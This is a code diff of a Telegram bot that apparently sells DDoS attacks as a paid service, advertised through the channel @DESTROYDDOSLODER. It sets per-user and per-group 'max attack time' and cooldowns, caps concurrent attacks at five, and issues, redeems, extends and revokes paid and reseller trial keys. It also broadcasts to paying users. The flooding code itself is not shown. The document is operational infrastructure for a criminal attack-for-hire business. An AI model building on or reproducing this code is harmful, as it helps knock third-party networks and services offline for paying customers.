+        bot.reply_to(message, f"✅ Group Approved!\n📢 {group_id}")
     else:
-        bot.reply_to(message, f"ℹ️ Group `{group_id}` already approved!", parse_mode="Markdown")
+        bot.reply_to(message, f"ℹ️ Already approved!")
 
 @bot.message_handler(commands=["removegrp"])
 def remove_group_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
@@ -1356,161 +1331,132 @@ def remove_group_command(message):
         bot.reply_to(message, "❌ Invalid group ID!")
         return
     if remove_approved_group(group_id):
-        bot.reply_to(message, f"✅ Group Removed!\n\n📢 Group ID: `{group_id}`", parse_mode="Markdown")
+        bot.reply_to(message, f"✅ Group Removed!")
     else:
-        bot.reply_to(message, f"❌ Group `{group_id}` not found!", parse_mode="Markdown")
+        bot.reply_to(message, f"❌ Not found!")
 
 @bot.message_handler(commands=["addlink"])
 def add_channel_link_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
-    bot.reply_to(message, "❌ Sirf ek channel allowed hai: @DESTROYDDOSLODER")
+    bot.reply_to(message, "❌ Sirf ek channel allowed: @DESTROYDDOSLODER")
 
 @bot.message_handler(commands=["removelink"])
 def remove_channel_link_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     bot.reply_to(message, "❌ @DESTROYDDOSLODER remove nahi kar sakte.")
 
 @bot.message_handler(commands=["channels"])
 def channels_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     response = "═══════════════════════════\n📢 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟\n═══════════════════════════\n\n"
-    response += f"🔘 Status: {'✅ REQUIRED' if get_channel_required() else '❌ NOT REQUIRED'}\n\n"
-    response += "📌 Only one channel:\n• https://t.me/DESTROYDDOSLODER (@DESTROYDDOSLODER)\n\n"
-    response += "Use /required_on or /required_off to toggle."
+    response += f"🔘 {'✅ REQUIRED' if get_channel_required() else '❌ NOT REQUIRED'}\n\n"
+    response += "📌 https://t.me/DESTROYDDOSLODER\n\n"
+    response += "Toggle: /required_on | /required_off"
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=["groups"])
 def groups_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     approved = get_approved_groups()
     response = "═══════════════════════════\n📢 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗚𝗥𝗢𝗨𝗣𝗦\n═══════════════════════════\n\n"
-    response += f"⚡ Max Time: {get_group_max_attack_time()}s\n⏳ Cooldown: {get_group_cooldown()}s\n🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n🔑 Key Required: ❌ NO\n🔢 Max Slots: 5\n\n"
     if approved:
-        response += f"📊 Total: {len(approved)}\n\n"
         for i, gid in enumerate(approved, 1):
             response += f"{i}. `{gid}`\n"
     else:
         response += "❌ No groups approved!\n"
-    response += "\n═══════════════════════════\nCommands:\n• /addgrp <id>\n• /removegrp <id>"
+    response += "\n═══════════════════════════"
     bot.reply_to(message, response, parse_mode="Markdown")
 
 @bot.message_handler(commands=["private_max"])
 def private_max_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) == 1:
-        current = get_private_max_attack_time()
-        bot.reply_to(message, f"⚙️ Current Private Max Attack Time: {current}s\n\nChange: /private_max <seconds>")
+        bot.reply_to(message, f"⚙️ Current: {get_private_max_attack_time()}s\nChange: /private_max <seconds>")
         return
     try:
         new_value = int(command_parts[1])
         if new_value < 10 or new_value > 600:
-            bot.reply_to(message, "❌ Value 10-600 seconds ke beech hona chahiye!")
+            bot.reply_to(message, "❌ 10-600!")
             return
         set_setting('private_max_attack_time', new_value)
-        bot.reply_to(message, f"✅ Private Max Attack Time set: {new_value}s")
+        bot.reply_to(message, f"✅ Set: {new_value}s")
     except ValueError:
         bot.reply_to(message, "❌ Invalid number!")
 
 @bot.message_handler(commands=["group_max"])
 def group_max_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) == 1:
-        current = get_group_max_attack_time()
-        bot.reply_to(message, f"⚙️ Current Group Max Attack Time: {current}s\n\nChange: /group_max <seconds>")
+        bot.reply_to(message, f"⚙️ Current: {get_group_max_attack_time()}s")
         return
     try:
         new_value = int(command_parts[1])
         if new_value < 10 or new_value > 300:
-            bot.reply_to(message, "❌ Value 10-300 seconds ke beech hona chahiye!")
+            bot.reply_to(message, "❌ 10-300!")
             return
         set_setting('group_max_attack_time', new_value)
-        bot.reply_to(message, f"✅ Group Max Attack Time set: {new_value}s")
+        bot.reply_to(message, f"✅ Set: {new_value}s")
     except ValueError:
         bot.reply_to(message, "❌ Invalid number!")
 
 @bot.message_handler(commands=["private_cooldown"])
 def private_cooldown_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) == 1:
-        current = get_private_cooldown()
-        bot.reply_to(message, f"⏳ Current Private Cooldown: {current}s\n\nChange: /private_cooldown <seconds>")
+        bot.reply_to(message, f"⏳ Current: {get_private_cooldown()}s")
         return
     try:
         new_value = int(command_parts[1])
         if new_value < 0 or new_value > 3600:
-            bot.reply_to(message, "❌ Value 0-3600 seconds ke beech hona chahiye!")
+            bot.reply_to(message, "❌ 0-3600!")
             return
         set_setting('private_cooldown', new_value)
-        bot.reply_to(message, f"✅ Private Cooldown set: {new_value}s")
+        bot.reply_to(message, f"✅ Set: {new_value}s")
     except ValueError:
         bot.reply_to(message, "❌ Invalid number!")
 
 @bot.message_handler(commands=["group_cooldown"])
 def group_cooldown_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) == 1:
-        current = get_group_cooldown()
-        bot.reply_to(message, f"⏳ Current Group Cooldown: {current}s\n\nChange: /group_cooldown <seconds>")
+        bot.reply_to(message, f"⏳ Current: {get_group_cooldown()}s")
         return
     try:
         new_value = int(command_parts[1])
         if new_value < 0 or new_value > 3600:
-            bot.reply_to(message, "❌ Value 0-3600 seconds ke beech hona chahiye!")
+            bot.reply_to(message, "❌ 0-3600!")
             return
         set_setting('group_cooldown', new_value)
-        bot.reply_to(message, f"✅ Group Cooldown set: {new_value}s")
+        bot.reply_to(message, f"✅ Set: {new_value}s")
     except ValueError:
         bot.reply_to(message, "❌ Invalid number!")
 
 @bot.message_handler(commands=["settings"])
 def settings_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     response = "═══════════════════════════════════════\n⚙️ 𝗕𝗢𝗧 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦\n═══════════════════════════════════════\n\n"
-    response += f"📱 𝗣𝗥𝗜𝗩𝗔𝗧𝗘\n• Max Time: {get_private_max_attack_time()}s\n• Cooldown: {get_private_cooldown()}s\n• Key: ✅ YES\n• DDoS: {'✅ ON' if get_ddos_protection() else '❌ OFF'}\n• Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n\n"
-    response += f"👥 𝗚𝗥𝗢𝗨𝗣\n• Max Time: {get_group_max_attack_time()}s\n• Cooldown: {get_group_cooldown()}s\n• Key: ❌ NO\n• DDoS: {'✅ ON' if get_ddos_protection() else '❌ OFF'}\n• Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n• Groups: {len(get_approved_groups())}\n\n"
-    response += f"⚡ 𝗦𝗟𝗢𝗧𝗦\n• Max Concurrent Attacks: 5\n\n"
-    response += f"📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟\n• @DESTROYDDOSLODER\n• Status: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}\n• Toggle: /required_on /required_off\n\n"
-    response += f"🎬 𝗥𝗘𝗘𝗟 𝗙𝗘𝗔𝗧𝗨𝗥𝗘\n• Status: {'ON' if get_reel_enabled() else 'OFF'}\n• Total Reels: {len(get_reel_list())}\n• Commands: /reel_on, /reel_off, /addreel, /removereel, /listreels\n\n"
-    response += f"📸 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞\n• Status: {'ON' if get_feedback_enabled() else 'OFF'}\n• Toggle: /feedback_on /feedback_off\n\n"
-    response += "Commands:\n/private_max <sec>\n/group_max <sec>\n/private_cooldown <sec>\n/group_cooldown <sec>\n/ddos_on /ddos_off\n/required_on /required_off\n/addgrp /removegrp"
+    response += f"📱 𝗣𝗥𝗜𝗩𝗔𝗧𝗘\n• Max: {get_private_max_attack_time()}s\n• Cooldown: {get_private_cooldown()}s\n• DDoS: {'✅' if get_ddos_protection() else '❌'}\n• Channel: {'✅' if get_channel_required() else '❌'}\n\n"
+    response += f"👥 𝗚𝗥𝗢𝗨𝗣\n• Max: {get_group_max_attack_time()}s\n• Cooldown: {get_group_cooldown()}s\n• Groups: {len(get_approved_groups())}\n\n"
+    response += f"🎬 𝗥𝗘𝗘𝗟: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())})\n"
+    response += f"📸 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞: {'ON' if get_feedback_enabled() else 'OFF'}\n"
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=["reseller_trail"])
 def reseller_trail_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 3:
@@ -1520,11 +1466,11 @@ def reseller_trail_command(message):
         hours = int(command_parts[1])
         max_users = int(command_parts[2])
     except ValueError:
-        bot.reply_to(message, "❌ Invalid hours or max_users!")
+        bot.reply_to(message, "❌ Invalid!")
         return
     resellers = list(resellers_collection.find({'blocked': {'$ne': True}}))
     if not resellers:
-        bot.reply_to(message, "❌ Koi active reseller nahi hai!")
+        bot.reply_to(message, "❌ Koi active reseller nahi!")
         return
     sent_count = 0
     for reseller in resellers:
@@ -1540,7 +1486,7 @@ def reseller_trail_command(message):
             'duration_seconds': hours * 3600,
             'duration_label': f"{hours} hours (Reseller Trail)",
             'created_at': datetime.now(),
-            'created_by': user_id,
+            'created_by': message.from_user.id,
             'created_by_username': reseller_username,
             'created_by_type': 'reseller_trail',
             'used': False,
@@ -1553,17 +1499,15 @@ def reseller_trail_command(message):
         }
         keys_collection.insert_one(key_doc)
         try:
-            bot.send_message(reseller_id, f"🎁 Reseller Trail Key!\n🔑 `{key}`\n⏰ {hours}h\n👥 {max_users} users", parse_mode="Markdown")
+            bot.send_message(reseller_id, f"🎁 Reseller Trail!\n🔑 `{key}`\n⏰ {hours}h\n👥 {max_users}", parse_mode="Markdown")
             sent_count += 1
         except:
             pass
-    bot.reply_to(message, f"✅ Reseller Trail Keys Sent!\n👥 {len(resellers)}\n📨 {sent_count} sent")
+    bot.reply_to(message, f"✅ Sent!\n👥 {len(resellers)}\n📨 {sent_count}")
 
 @bot.message_handler(commands=["trail"])
 def owner_trail_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 3:
@@ -1587,7 +1531,7 @@ def owner_trail_command(message):
             'duration_seconds': int(duration.total_seconds()),
             'duration_label': f"{duration_label} (Owner Trail)",
             'created_at': datetime.now(),
-            'created_by': user_id,
+            'created_by': message.from_user.id,
             'created_by_type': 'owner_trail',
             'used': False,
             'used_by': None,
@@ -1598,13 +1542,11 @@ def owner_trail_command(message):
         keys_collection.insert_one(key_doc)
         generated_keys.append(key)
     keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
-    bot.reply_to(message, f"✅ {count} Owner Trail Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", parse_mode="HTML")
+    bot.reply_to(message, f"✅ {count} Trail Keys!\n\n🔑 {keys_text}\n\n⏰ {duration_label}", parse_mode="HTML")
 
 @bot.message_handler(commands=["user_resell"])
 def user_resell_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
@@ -1623,8 +1565,8 @@ def user_resell_command(message):
     for i, key in enumerate(keys[:15], 1):
         user = users_collection.find_one({'key': key['key']})
         if user:
-            response += f"{i}. 👤 {user.get('username', 'Unknown')}\n   📱 ID: {user['user_id']}\n   🔑 Key: {key['key']}\n\n"
-    response += f"═══════════════════════════\n📊 Total Users: {len(keys)}"
+            response += f"{i}. 👤 {user.get('username', 'Unknown')}\n   📱 ID: {user['user_id']}\n   🔑 {key['key']}\n\n"
+    response += f"═══════════════════════════\n📊 Total: {len(keys)}"
     bot.reply_to(message, response)
 
 pending_broadcast = {}
@@ -1633,9 +1575,7 @@ _broadcast_lock = threading.Lock()
 
 @bot.message_handler(commands=["broadcast_paid"])
 def broadcast_paid_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split(maxsplit=1)
     if len(command_parts) < 2:
@@ -1649,7 +1589,7 @@ def broadcast_paid_command(message):
         return
     sent_count = 0
     fail_count = 0
-    progress_msg = bot.reply_to(message, f"📢 Broadcasting to {len(active_subscribers)} paid users...")
+    progress_msg = bot.reply_to(message, f"📢 Broadcasting to {len(active_subscribers)}...")
     for user in active_subscribers:
         try:
             target_id = user['user_id']
@@ -1660,18 +1600,16 @@ def broadcast_paid_command(message):
             time.sleep(0.05)
         except Exception:
             fail_count += 1
-    bot.edit_message_text(f"✅ Broadcast Complete!\n\n👤 Sent: {sent_count} paid users\n❌ Failed: {fail_count}", message.chat.id, progress_msg.message_id)
+    bot.edit_message_text(f"✅ Complete!\n👤 Sent: {sent_count}\n❌ Failed: {fail_count}", message.chat.id, progress_msg.message_id)
 
 @bot.message_handler(commands=["broadcast"])
 def broadcast_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     reply_msg = message.reply_to_message
     command_parts = message.text.split(maxsplit=1)
     if not reply_msg and len(command_parts) < 2:
-        bot.reply_to(message, "⚠️ Usage:\n• /broadcast <message>\n• Reply to a message and /broadcast")
+        bot.reply_to(message, "⚠️ Usage: /broadcast <message>")
         return
     all_users = list(users_collection.find())
     all_resellers = list(resellers_collection.find())
@@ -1684,13 +1622,12 @@ def broadcast_command(message):
     for bu in all_bot_users:
         all_user_ids.add(bu['user_id'])
     if reply_msg:
-        pending_broadcast[user_id] = {'type': 'reply', 'message': reply_msg, 'users': all_user_ids}
-        content_type = "Photo" if reply_msg.photo else "Video" if reply_msg.video else "Document" if reply_msg.document else "Poll" if reply_msg.poll else "Audio" if reply_msg.audio else "Sticker" if reply_msg.sticker else "Text"
-        bot.reply_to(message, f"⚠️ Broadcast Confirmation\n\n📦 Content: {content_type}\n👥 Users: {len(all_user_ids)}\n\n✅ /confirm_broadcast\n❌ /cancel_broadcast")
+        pending_broadcast[message.from_user.id] = {'type': 'reply', 'message': reply_msg, 'users': all_user_ids}
+        bot.reply_to(message, f"⚠️ Confirm?\n👥 {len(all_user_ids)}\n\n/confirm_broadcast\n/cancel_broadcast")
     else:
         broadcast_msg = command_parts[1]
-        pending_broadcast[user_id] = {'type': 'text', 'message': broadcast_msg, 'users': all_user_ids}
-        bot.reply_to(message, f"⚠️ Broadcast Confirmation\n\n📝 Message: {broadcast_msg[:100]}{'...' if len(broadcast_msg) > 100 else ''}\n👥 Users: {len(all_user_ids)}\n\n✅ /confirm_broadcast\n❌ /cancel_broadcast")
+        pending_broadcast[message.from_user.id] = {'type': 'text', 'message': broadcast_msg, 'users': all_user_ids}
+        bot.reply_to(message, f"⚠️ Confirm?\n👥 {len(all_user_ids)}\n\n/confirm_broadcast\n/cancel_broadcast")
 
 @bot.message_handler(commands=["confirm_broadcast"])
 def confirm_broadcast_command(message):
@@ -1713,7 +1650,7 @@ def confirm_broadcast_command(message):
             sent_count += 1
         except:
             failed_count += 1
-    bot.reply_to(message, f"✅ Broadcast Sent!\n\n📨 Total: {len(data['users'])}\n✅ Delivered: {sent_count}\n❌ Failed: {failed_count}")
+    bot.reply_to(message, f"✅ Sent!\n📨 {len(data['users'])}\n✅ {sent_count}\n❌ {failed_count}")
 
 @bot.message_handler(commands=["cancel_broadcast"])
 def cancel_broadcast_command(message):
@@ -1728,31 +1665,28 @@ def cancel_broadcast_command(message):
         del pending_broadcast_reseller[user_id]
         cancelled = True
     if cancelled:
-        bot.reply_to(message, "❌ Broadcast cancelled!")
+        bot.reply_to(message, "❌ Cancelled!")
     else:
-        bot.reply_to(message, "ℹ️ Koi pending broadcast nahi hai.")
+        bot.reply_to(message, "ℹ️ Koi pending nahi.")
 
 @bot.message_handler(commands=["broadcast_reseller"])
 def broadcast_reseller_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     reply_msg = message.reply_to_message
     command_parts = message.text.split(maxsplit=1)
     if not reply_msg and len(command_parts) < 2:
-        bot.reply_to(message, "⚠️ Usage:\n• /broadcast_reseller <message>\n• Reply to a message")
+        bot.reply_to(message, "⚠️ Usage: /broadcast_reseller <message>")
         return
     resellers = list(resellers_collection.find())
     reseller_ids = set(r['user_id'] for r in resellers)
     if reply_msg:
-        pending_broadcast_reseller[user_id] = {'type': 'reply', 'message': reply_msg, 'users': reseller_ids}
-        content_type = "Photo" if reply_msg.photo else "Video" if reply_msg.video else "Document" if reply_msg.document else "Poll" if reply_msg.poll else "Audio" if reply_msg.audio else "Sticker" if reply_msg.sticker else "Text"
-        bot.reply_to(message, f"⚠️ Reseller Broadcast Confirmation\n\n📦 Content: {content_type}\n👥 Resellers: {len(reseller_ids)}\n\n✅ /confirm_broadcast_reseller\n❌ /cancel_broadcast")
+        pending_broadcast_reseller[message.from_user.id] = {'type': 'reply', 'message': reply_msg, 'users': reseller_ids}
+        bot.reply_to(message, f"⚠️ Confirm?\n👥 {len(reseller_ids)}\n\n/confirm_broadcast_reseller\n/cancel_broadcast")
     else:
         broadcast_msg = command_parts[1]
-        pending_broadcast_reseller[user_id] = {'type': 'text', 'message': broadcast_msg, 'users': reseller_ids}
-        bot.reply_to(message, f"⚠️ Reseller Broadcast Confirmation\n\n📝 Message: {broadcast_msg[:100]}{'...' if len(broadcast_msg) > 100 else ''}\n👥 Resellers: {len(reseller_ids)}\n\n✅ /confirm_broadcast_reseller\n❌ /cancel_broadcast")
+        pending_broadcast_reseller[message.from_user.id] = {'type': 'text', 'message': broadcast_msg, 'users': reseller_ids}
+        bot.reply_to(message, f"⚠️ Confirm?\n👥 {len(reseller_ids)}\n\n/confirm_broadcast_reseller\n/cancel_broadcast")
 
 @bot.message_handler(commands=["confirm_broadcast_reseller"])
 def confirm_broadcast_reseller_command(message):
@@ -1775,7 +1709,7 @@ def confirm_broadcast_reseller_command(message):
             sent_count += 1
         except:
             failed_count += 1
-    bot.reply_to(message, f"✅ Reseller Broadcast Sent!\n\n📨 Total: {len(data['users'])}\n✅ Delivered: {sent_count}\n❌ Failed: {failed_count}")
+    bot.reply_to(message, f"✅ Sent!\n📨 {len(data['users'])}\n✅ {sent_count}\n❌ {failed_count}")
 
 @bot.message_handler(commands=["redeem"])
 def redeem_key_command(message):
@@ -1803,12 +1737,12 @@ def redeem_key_command(message):
             abuse_count = user_data.get('trail_abuse_count', 0) + 1
             users_collection.update_one({'user_id': user_id}, {'$set': {'trail_abuse_count': abuse_count}})
             if abuse_count == 1:
-                bot.reply_to(message, "⚠️ Warning: Aap trail key se time extend nahi kar sakte!")
+                bot.reply_to(message, "⚠️ Warning: Trail key se extend nahi kar sakte!")
             else:
                 ban_minutes = 10 * (2 ** (abuse_count - 2))
                 ban_expiry = datetime.now() + timedelta(minutes=ban_minutes)
                 users_collection.update_one({'user_id': user_id}, {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}})
-                bot.reply_to(message, f"🚫 Trail key abuse ki wajah se aapko {ban_minutes} minutes ke liye ban kar diya gaya hai!")
+                bot.reply_to(message, f"🚫 {ban_minutes} min ban!")
             return
     user = users_collection.find_one({'user_id': user_id})
     reseller_username = key_doc.get('created_by_username') if key_doc.get('created_by_type') == 'reseller' else None
@@ -1828,7 +1762,7 @@ def redeem_key_command(message):
         else:
             keys_collection.update_one({'key': key_input}, {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}})
         new_remaining = get_time_remaining(user_id)
-        bot.reply_to(message, f"✅ Key Extended!\n\n🔑 Key: `{key_input}`\n⏰ Added: {key_doc['duration_label']}\n⏳ Total Time: {new_remaining}", parse_mode="Markdown")
+        bot.reply_to(message, f"✅ Key Extended!\n\n🔑 `{key_input}`\n⏰ Added: {key_doc['duration_label']}\n⏳ Total: {new_remaining}", parse_mode="Markdown")
     else:
         expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
         users_collection.update_one({'user_id': user_id}, {'$set': {
@@ -1847,7 +1781,7 @@ def redeem_key_command(message):
         else:
             keys_collection.update_one({'key': key_input}, {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}})
         remaining = get_time_remaining(user_id)
-        bot.reply_to(message, f"✅ Key Redeemed!\n\n🔑 Key: `{key_input}`\n⏰ Duration: {key_doc['duration_label']}\n⏳ Time Left: {remaining}", parse_mode="Markdown")
+        bot.reply_to(message, f"✅ Key Redeemed!\n\n🔑 `{key_input}`\n⏰ {key_doc['duration_label']}\n⏳ {remaining}", parse_mode="Markdown")
 
 @bot.message_handler(commands=["mykey"])
 def my_key_command(message):
@@ -1861,12 +1795,12 @@ def my_key_command(message):
     if not has_valid_key(user_id):
         reseller_username = user.get('reseller_username')
         if reseller_username:
-            bot.reply_to(message, f"❌ Key khatam ho gayi!\n\n🔄 Renew ke liye DM karo: @{reseller_username}", parse_mode="Markdown")
+            bot.reply_to(message, f"❌ Key khatam!\n🔄 Renew: @{reseller_username}", parse_mode="Markdown")
         else:
-            bot.reply_to(message, "❌ Key khatam ho gayi!")
+            bot.reply_to(message, "❌ Key khatam!")
         return
     remaining = get_time_remaining(user_id)
-    bot.reply_to(message, f"🔑 Key Details\n\n📌 Key: `{user['key']}`\n⏳ Remaining: {remaining}\n✅ Status: Active", parse_mode="Markdown")
+    bot.reply_to(message, f"🔑 Key Details\n\n📌 `{user['key']}`\n⏳ {remaining}\n✅ Active", parse_mode="Markdown")
 
 @bot.message_handler(commands=["status"])
 def status_command(message):
@@ -1895,9 +1829,7 @@ def status_command(message):
 
 @bot.message_handler(commands=["extend"])
 def extend_key_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 3:
@@ -1914,7 +1846,7 @@ def extend_key_command(message):
         return
     user = users_collection.find_one({'user_id': target_user_id})
     if not user:
-        bot.reply_to(message, "❌ User key database mein nahi mila!")
+        bot.reply_to(message, "❌ User DB mein nahi mila!")
         return
     if user.get('key_expiry') and user['key_expiry'] > datetime.now():
         new_expiry = user['key_expiry'] + duration
@@ -1923,17 +1855,15 @@ def extend_key_command(message):
     users_collection.update_one({'user_id': target_user_id}, {'$set': {'key_expiry': new_expiry}})
     new_remaining = format_timedelta(new_expiry - datetime.now())
     try:
-        bot.send_message(target_user_id, f"🎉 Time Extended!\n\n⏰ Added: {duration_label}\n⏳ Total Time: {new_remaining}\n\nEnjoy!")
+        bot.send_message(target_user_id, f"🎉 Time Extended!\n⏰ {duration_label}\n⏳ {new_remaining}")
     except:
         pass
     display = f"@{resolved_name}" if resolved_name else str(target_user_id)
-    bot.reply_to(message, f"✅ Time Extended!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n⏰ Added: {duration_label}\n⏳ New Time: {new_remaining}")
+    bot.reply_to(message, f"✅ Extended!\n👤 {display}\n⏰ {duration_label}\n⏳ {new_remaining}")
 
 @bot.message_handler(commands=["extend_all"])
 def extend_all_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
@@ -1946,7 +1876,7 @@ def extend_all_command(message):
         return
     all_users = list(users_collection.find({'key': {'$ne': None}}))
     if not all_users:
-        bot.reply_to(message, "❌ Koi user nahi hai jinke paas key ho!")
+        bot.reply_to(message, "❌ Koi user nahi!")
         return
     extended_count = 0
     notified_count = 0
@@ -1960,17 +1890,15 @@ def extend_all_command(message):
         users_collection.update_one({'user_id': uid}, {'$set': {'key_expiry': new_expiry}})
         extended_count += 1
         try:
-            bot.send_message(uid, f"🎉 Time Extended for ALL Users!\n\n⏰ Added: {duration_label}\n\nEnjoy!")
+            bot.send_message(uid, f"🎉 Time Extended!\n⏰ {duration_label}")
             notified_count += 1
         except:
             pass
-    bot.reply_to(message, f"✅ Done! Sabka time extend ho gaya.\n\n👤 Total Users: {extended_count}\n📨 Notified: {notified_count}\n⏰ Added: {duration_label}")
+    bot.reply_to(message, f"✅ Done!\n👤 {extended_count}\n📨 {notified_count}\n⏰ {duration_label}")
 
 @bot.message_handler(commands=["down"])
 def down_key_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 3:
@@ -1987,26 +1915,24 @@ def down_key_command(message):
         return
     user = users_collection.find_one({'user_id': target_user_id})
     if not user:
-        bot.reply_to(message, "❌ User key database mein nahi mila!")
+        bot.reply_to(message, "❌ User DB mein nahi mila!")
         return
     if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
-        bot.reply_to(message, "❌ User ke paas active key nahi hai!")
+        bot.reply_to(message, "❌ User ke paas active key nahi!")
         return
     new_expiry = user['key_expiry'] - duration
     display = f"@{resolved_name}" if resolved_name else str(target_user_id)
     if new_expiry <= datetime.now():
         users_collection.update_one({'user_id': target_user_id}, {'$set': {'key': None, 'key_expiry': None}})
-        bot.reply_to(message, f"⚠️ Key Expired!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n❌ Key removed!")
+        bot.reply_to(message, f"⚠️ Key Expired!\n👤 {display}\n❌ Removed!")
     else:
         users_collection.update_one({'user_id': target_user_id}, {'$set': {'key_expiry': new_expiry}})
         new_remaining = format_timedelta(new_expiry - datetime.now())
-        bot.reply_to(message, f"✅ Time Reduced!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n⏰ Reduced: {duration_label}\n⏳ New Time: {new_remaining}")
+        bot.reply_to(message, f"✅ Reduced!\n👤 {display}\n⏰ {duration_label}\n⏳ {new_remaining}")
 
 @bot.message_handler(commands=["delkey"])
 def delete_key_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
@@ -2022,9 +1948,7 @@ def delete_key_command(message):
 
 @bot.message_handler(commands=["key"])
 def key_details_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
@@ -2036,49 +1960,47 @@ def key_details_command(message):
         bot.reply_to(message, "❌ Key nahi mili!")
         return
     response = "═══════════════════════════\n🔑 𝗞𝗘𝗬 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n═══════════════════════════\n\n"
-    response += f"🔑 Key: {key_input}\n⏰ Duration: {key_doc.get('duration_label', 'Unknown')}\n⏱️ Seconds: {key_doc.get('duration_seconds', 0)}\n📅 Created: {key_doc.get('created_at', 'Unknown')}\n"
+    response += f"🔑 {key_input}\n⏰ {key_doc.get('duration_label', 'Unknown')}\n⏱️ {key_doc.get('duration_seconds', 0)}\n📅 {key_doc.get('created_at', 'Unknown')}\n"
     creator_type = key_doc.get('created_by_type', 'owner')
     if creator_type == 'reseller':
